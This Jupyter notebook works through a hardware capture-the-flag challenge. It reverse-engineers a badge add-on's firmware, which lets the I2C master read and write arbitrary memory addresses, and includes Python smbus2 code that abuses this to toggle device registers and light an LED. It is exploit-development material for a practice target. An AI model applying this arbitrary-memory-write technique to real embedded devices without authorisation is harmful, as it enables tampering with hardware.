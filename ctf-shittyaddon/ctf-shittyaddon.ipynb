{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CTF ShittyAddon\n",
    "\n",
    "To be run on a Raspberry Pi, which talks to the SAO via `I2C`\n",
    "\n",
    "#### General\n",
    "\n",
    "- Flag is kept in flash, not in SRAM\n",
    "\n",
    "#### Understanding what the DUTs firmware does\n",
    "\n",
    "- `setup()`\n",
    "    - Sets up own address to be `0x23`\n",
    "    - Hooks up I2C interrupts\n",
    "    - XORs `flash_value` (Initially `0x20`) with each char in the flag individually\n",
    "- `loop()`\n",
    "    - `erase` gets HIGH when `flash_addr` has `0x8000` set\n",
    "    - `flash_addr` gets ANDed with `0x1fff`\n",
    "    - Whenever `flash_addr` > `0x800`:\n",
    "        - If `erase` is HIGH:\n",
    "            - Call `boot_page_erase_safe`\n",
    "        - else\n",
    "            - Call `boot_page_fill_safe`, writing out `flash_value` to `flash_addr`\n",
    "            - Call `boot_page_write` on `flash_addr`\n",
    "    - Reset `flash_addr` to 0\n",
    "- `onI2CReceive()`\n",
    "    - Writes first byte received into `target`\n",
    "    - Uses `target` as a pointer and writes subsequently received bytes into the target location\n",
    "- `onI2CRequest()`\n",
    "    - Sends the current value of `target`\n",
    "    - Interprets `target++` as a pointer, limiting it to `0x1fff`, putting it into `addr`\n",
    "    - Seems to send a byte found at an adress, but needs to decide if it can read from pgm or directly?\n",
    "        - If `target & 0x8000`\n",
    "            - Sends a byte read from the program at adress `addr`\n",
    "        - else\n",
    "            - Sends the dereferenced value of `addr`\n",
    "\n",
    "\n",
    "##### Flag XOR thingy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Starting values\n",
    "flash_value = 0x20\n",
    "flag = \"$FLAG:SECRET\"\n",
    "\n",
    "# XOR flash_value with flag like setup()\n",
    "for char in flag:\n",
    "    flash_value ^= ord(char)\n",
    "    print(char + \" = \" + str(ord(char)) + \" | flash_value --> \" + str(flash_value))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### `flash_addr` simulation\n",
    "\n",
    "The whole loop seems to be used only for the rootkit stuff. There seems to be a limiter to `flash_addr`, preventing write access above `0x1fff`, as well as methods to delete and write stuff into the boot page"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Declare start value\n",
    "flash_addr  = 0x400\n",
    "erase       = False\n",
    "\n",
    "print(0x1fff) # Limits flash_addr\n",
    "print(0x8000) # Sets \"erase\"\n",
    "print(0x0800) # Values above start executing stuff below\n",
    "\n",
    "# Simulate a few iterations\n",
    "for i in range (10):\n",
    "    erase = flash_addr & 0x8000\n",
    "    flash_addr &= 0x1fff\n",
    "    print(\"Erase = \" + str(erase) + \" | flash_addr = \" + hex(flash_addr))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Test if we can talk to DUT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smbus2\n",
    "\n",
    "channel     = 1             # Used I2C channel\n",
    "dutAdr      = 0x23          # Address of the DUT\n",
    "\n",
    "# Init I2C\n",
    "bus = smbus2.SMBus(channel)\n",
    "bus.write_byte(dutAdr, 0x69)\n",
    "response = bus.read_byte(dutAdr)\n",
    "\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Attack 1 - Make LED light up"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smbus2\n",
    "\n",
    "channel     = 1             # Used I2C channel\n",
    "dutAdr      = 0x23          # Address of the DUT\n",
    "portAdr     = 0x18          # Address of PORTB, where the LED is connected to\n",
    "ddrAdr      = 0x17          # Address of DDRB, to set the LED pin as an output\n",
    "ledBit      = 0b00000010    # Bit in PORTB where the LED is connected to\n",
    "\n",
    "# Init I2C\n",
    "bus = smbus2.SMBus(channel) \n",
    "\n",
    "###############\n",
    "# Update DDRB\n",
    "###############\n",
    "print('Reading DDRB')\n",
    "\n",
    "# Write target address into DUT\n",
    "bus.write_byte(dutAdr, ddrAdr)\n",
    "\n",
    "# Read byte at target location from DUT\n",
    "target      = bus.read_byte(dutAdr)\n",
    "stateDDRB   = bus.read_byte(dutAdr)\n",
    "print('target = '   + hex(target))\n",
    "print('Old DDRB = ' + bin(stateDDRB))\n",
    "\n",
    "# Set LED pin to output\n",
    "stateDDRB |= ledBit\n",
    "\n",
    "# Write DDRB back into DUT, but decrement the target adress\n",
    "data = [ddrAdr - 0x01, stateDDRB]\n",
    "bus.write_i2c_block_data(dutAdr, 0, data)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
